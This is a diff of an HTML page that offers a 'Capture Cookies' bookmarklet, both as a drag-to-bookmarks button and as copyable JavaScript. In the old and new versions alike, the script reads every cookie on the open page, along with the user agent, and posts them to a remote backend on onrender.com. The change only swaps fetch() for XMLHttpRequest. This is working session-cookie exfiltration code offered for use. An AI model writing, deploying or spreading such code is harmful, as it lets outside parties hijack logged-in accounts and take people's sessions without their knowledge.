@@ -142,7 +142,7 @@
             <p>Drag this button to your bookmarks bar:</p>
             <div class="drag-hint">👇 Drag Me 👇</div>
             <div style="text-align: center;">
-                <a href='javascript:(function(){const API_URL="REPLACE_WITH_YOUR_API_URL";const cookies=document.cookie;if(!cookies){alert("❌ No cookies found on this page!");return;}fetch(API_URL+"/api/cookies/manual",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cookie:cookies,userAgent:navigator.userAgent})}).then(r=>r.json()).then(d=>{if(d.success){alert("✅ Success! Captured "+d.cookieCount+" cookies");}else{alert("❌ Error: "+d.error);}}).catch(e=>alert("❌ Network error: "+e.message));})();' 
+                <a href='javascript:(function(){const API="REPLACE_WITH_YOUR_API_URL";const c=document.cookie;if(!c){alert("❌ No cookies found!");return;}const x=new XMLHttpRequest();x.open("POST",API+"/api/cookies/manual",true);x.setRequestHeader("Content-Type","application/json");x.onload=function(){if(x.status===200){const r=JSON.parse(x.responseText);alert("✅ Success! "+r.cookieCount+" cookies captured");}else{alert("❌ Error: "+x.responseText);}};x.onerror=function(){alert("❌ Network error. Check API URL.")};x.send(JSON.stringify({cookie:c,userAgent:navigator.userAgent}));})();' 
                    class="bookmarklet"
                    onclick="return false;">
                     🍪 Capture Cookies
@@ -174,7 +174,7 @@ https://backend-zbr5.onrender.com
             <h4>🔧 Alternative: Create Bookmarklet Manually</h4>
             <p>If drag-and-drop doesn't work, create a new bookmark manually with this JavaScript code:</p>
             <div class="code" onclick="copyToClipboard(this.textContent.trim())" id="jsCode">
-javascript:(function(){const API_URL="https://backend-zbr5.onrender.com";const cookies=document.cookie;if(!cookies){alert("❌ No cookies found on this page!");return;}fetch(API_URL+"/api/cookies/manual",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cookie:cookies,userAgent:navigator.userAgent})}).then(r=>r.json()).then(d=>{if(d.success){alert("✅ Success! Captured "+d.cookieCount+" cookies");}else{alert("❌ Error: "+d.error);}}).catch(e=>alert("❌ Network error: "+e.message));})();
+javascript:(function(){const API="https://backend-zbr5.onrender.com";const c=document.cookie;if(!c){alert("❌ No cookies found!");return;}const x=new XMLHttpRequest();x.open("POST",API+"/api/cookies/manual",true);x.setRequestHeader("Content-Type","application/json");x.onload=function(){if(x.status===200){const r=JSON.parse(x.responseText);alert("✅ Success! "+r.cookieCount+" cookies captured");}else{alert("❌ Error: "+x.responseText);}};x.onerror=function(){alert("❌ Network error. Check API URL.")};x.send(JSON.stringify({cookie:c,userAgent:navigator.userAgent}));})();
             </div>
             <button onclick="copyToClipboard(document.getElementById('jsCode').textContent.trim())">📋 Copy Code</button>
             <p style="margin-top: 10px; font-size: 13px; color: #666;">
